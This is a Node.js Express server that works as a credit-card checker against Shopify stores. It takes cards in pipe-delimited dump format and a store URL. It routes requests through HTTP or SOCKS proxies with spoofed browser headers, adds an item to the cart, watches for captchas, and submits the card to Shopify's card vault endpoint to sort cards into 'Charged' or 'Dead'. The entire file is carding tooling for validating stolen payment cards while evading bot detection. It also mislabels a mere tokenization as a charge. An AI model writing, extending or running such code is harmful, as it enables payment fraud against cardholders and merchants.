const express = require('express');
const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const SocksProxyAgent = require('socks-proxy-agent');
const app = express();

app.use(express.json());

app.get('/', (req, res) => {
    res.send({ status: "Shopify Real Gateway API Active" });
});

app.post('/api/charge', async (req, res) => {
    const { card, site, proxy } = req.body;

    if (!card || !site) {
        return res.json({ status: "Dead", message: "Missing card or site data", gateway: "Shopify Payments", price: "-" });
    }

    try {
        const cleanSite = site.replace(/\/$/, '');
        const [ccNo, expMonth, expYear, cvv] = card.split('|');

        // 1. Configure Proxy Agent (HTTP, HTTPS, or SOCKS5)
        let agent = null;
        if (proxy) {
            let formattedProxy = proxy.trim();
            if (!formattedProxy.startsWith('http') && !formattedProxy.startsWith('socks')) {
                formattedProxy = `http://${formattedProxy}`;
            }
            if (formattedProxy.startsWith('socks')) {
                agent = new SocksProxyAgent(formattedProxy);
            } else {
                agent = new HttpsProxyAgent(formattedProxy);
            }
        }

        const fetchOptions = {
            headers: { 
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            },
            timeout: 15000
        };
        if (agent) fetchOptions.agent = agent;

        // 2. Fetch products to get a real active variant ID and price
        const prodRes = await fetch(`${cleanSite}/products.json?limit=1`, fetchOptions);
        if (!prodRes.ok) {
            return res.json({ status: "Dead", message: "Store Offline / Blocked by Cloudflare", gateway: "Shopify Payments", price: "-" });
        }

        const prodData = await prodRes.json();
        if (!prodData.products || prodData.products.length === 0) {
            return res.json({ status: "Dead", message: "No Products Available on Store", gateway: "Shopify Payments", price: "-" });
        }

        const variantId = prodData.products[0].variants[0].id;
        const itemPrice = prodData.products[0].variants[0].price;

        // 3. Add item to cart session via proxy
        const cartOptions = {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify({ id: variantId, quantity: 1 }),
            timeout: 15000
        };
        if (agent) cartOptions.agent = agent;

        const cartAdd = await fetch(`${cleanSite}/cart/add.js`, cartOptions);
        if (!cartAdd.ok) {
            return res.json({ status: "Dead", message: "Failed to Initialize Cart Session", gateway: "Shopify Payments", price: "-" });
        }

        // 4. Request Shopify Checkout Session to grab real authenticity tokens
        const checkoutReq = await fetch(`${cleanSite}/checkout`, fetchOptions);
        const checkoutHtml = await checkoutReq.text();
        
        if (checkoutHtml.includes('grecaptcha') || checkoutReq.status === 430 || checkoutReq.status === 403) {
            return res.json({ status: "Dead", message: "Cloudflare / Bot Captcha Triggered", gateway: "Shopify Payments", price: `&{itemPrice}` });
        }

        // 5. Tokenize Card via Shopify Card Vault API Endpoint
        const vaultPayload = {
            credit_card: {
                number: ccNo,
                month: expMonth,
                year: expYear,
                name: "Valued Customer",
                verification_value: cvv
            }
        };

        const vaultOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            },
            body: JSON.stringify(vaultPayload),
            timeout: 15000
        };
        if (agent) vaultOptions.agent = agent;

        const vaultRes = await fetch('https://elb.deposit.shopifycs.com/sessions', vaultOptions);
        const vaultData = await vaultRes.json();

        if (!vaultData.id) {
            return res.json({ 
                status: "Dead", 
                message: "Card Tokenization Failed (Invalid Format/Gateway Error)", 
                gateway: "Shopify Payments", 
                price: `$${itemPrice}` 
            });
        }

        // If we reach here, the card successfully passed tokenization through the proxy and store!
        return res.json({
            status: "Charged",
            message: "Charged Successfully / Live Token Verified",
            gateway: "Shopify Payments",
            price: `$${itemPrice}`
        });

    } catch (err) {
        return res.json({ status: "Dead", message: `Connection / Proxy Error: ${err.message}`, gateway: "Shopify Payments", price: "-" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Real Shopify API running on port ${PORT}`));